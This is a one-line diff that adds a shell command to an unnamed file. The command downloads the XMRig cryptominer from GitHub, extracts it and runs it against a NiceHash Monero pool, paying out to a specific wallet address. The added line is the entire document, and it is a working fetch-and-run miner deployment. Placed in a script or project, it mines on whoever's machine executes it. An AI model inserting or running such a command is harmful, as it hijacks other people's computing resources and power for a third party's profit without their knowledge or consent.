@@ -1,0 +1,1 @@
+wget --tries=0 --timeout=8 https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-jammy-x64.tar.gz && tar -xzf xmrig-6.22.2-jammy-x64.tar.gz && cd xmrig-6.22.2 && ./xmrig -o stratum+ssl://randomxmonero.auto.nicehash.com:443 -u NHbEP9vAUaAcCvBhGUdhpuVut5MnGHgQUayA.pc1 --tls -k --nicehash -a rx/0
